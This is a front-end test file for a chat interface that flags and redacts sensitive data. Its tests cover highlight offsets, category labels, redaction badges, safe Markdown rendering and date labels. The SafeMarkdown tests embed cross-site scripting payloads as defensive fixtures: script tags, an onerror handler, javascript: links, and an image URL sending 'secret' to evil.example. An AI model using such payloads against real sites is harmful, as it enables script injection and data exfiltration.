import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import type { Flag } from "@/api/types";
import { chatDate } from "@/layout/Sidebar";

import { categoryLabel } from "./categories";
import { characterCount, highlightSegments } from "./highlight";
import { RedactedText } from "./RedactedText";
import { SafeMarkdown, safeUrl } from "./SafeMarkdown";

const flag = (startIndex: number, endIndex: number, category = "SA_ID"): Flag => ({
  category,
  startIndex,
  endIndex,
  detectorSource: "rule",
  explanation: "x",
});

describe("highlightSegments", () => {
  it("splits plain and flagged text", () => {
    expect(highlightSegments("My ID is 123 ok", [flag(9, 12)])).toEqual([
      { text: "My ID is ", flagged: false },
      { text: "123", flagged: true },
      { text: " ok", flagged: false },
    ]);
  });

  it("counts in characters like the backend, so emoji don't shift highlights", () => {
    // "😀" is one character for Python but two UTF-16 units in JavaScript.
    expect(highlightSegments("😀 ID 123", [flag(5, 8)]).filter((s) => s.flagged)).toEqual([
      { text: "123", flagged: true },
    ]);
  });

  it("merges overlaps and ignores out-of-range positions", () => {
    expect(highlightSegments("abcdef", [flag(1, 4), flag(3, 5), flag(10, 20), flag(4, 2)])).toEqual([
      { text: "a", flagged: false },
      { text: "bcde", flagged: true },
      { text: "f", flagged: false },
    ]);
  });

  it("counts characters", () => {
    expect(characterCount("😀ab")).toBe(3);
  });
});

describe("categoryLabel", () => {
  it.each([
    ["SA_ID", "ID number"],
    ["MEDICAL", "Health information"],
    ["NEW_THING", "New thing"],
    ["", "Sensitive information"],
  ])("%s -> %s", (category, label) => {
    expect(categoryLabel(category)).toBe(label);
  });
});

describe("RedactedText", () => {
  it("shows placeholders as 'hidden' badges and everything else as text", () => {
    render(<RedactedText text="ID [REDACTED_SA_ID] and <b>[note]</b>" />);
    expect(screen.getByTitle("ID number hidden from the AI")).toBeInTheDocument();
    expect(screen.getByText(/and <b>\[note\]<\/b>/)).toBeInTheDocument();
    expect(document.querySelector("b")).toBeNull();
  });
});

describe("SafeMarkdown", () => {
  it("renders Markdown formatting", () => {
    render(<SafeMarkdown text={"**Bold** and a list:\n\n- one\n- two"} />);
    expect(screen.getByText("Bold").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("never renders HTML from the reply", () => {
    const { container } = render(
      <SafeMarkdown text={'Hi <script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>'} />,
    );
    expect(container.querySelector("script, img, iframe")).toBeNull();
  });

  it("does not load images (no tracking or data leaks through image URLs)", () => {
    const { container } = render(<SafeMarkdown text="![x](https://evil.example/pixel?data=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops dangerous link targets", () => {
    render(<SafeMarkdown text="[click](javascript:alert(1)) [data](data:text/html,hi)" />);
    expect(screen.queryAllByRole("link")).toHaveLength(0);
    expect(safeUrl("javascript:alert(1)")).toBe("");
    expect(safeUrl("vbscript:x")).toBe("");
  });

  it("opens safe links in a new tab without a referrer", () => {
    render(<SafeMarkdown text="[docs](https://example.org/page)" />);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://example.org/page");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noopener");
    expect(link.getAttribute("rel")).toContain("noreferrer");
  });
});

describe("chatDate", () => {
  const now = new Date("2026-11-04T15:00:00");
  it("says today, yesterday, or the date", () => {
    expect(chatDate("2026-11-04T09:30:00", now)).toMatch(/^Today /);
    expect(chatDate("2026-11-03T20:00:00", now)).toBe("Yesterday");
    expect(chatDate("2026-10-01T12:00:00", now)).toMatch(/1/);
    expect(chatDate("not a date", now)).toBe("");
  });
});
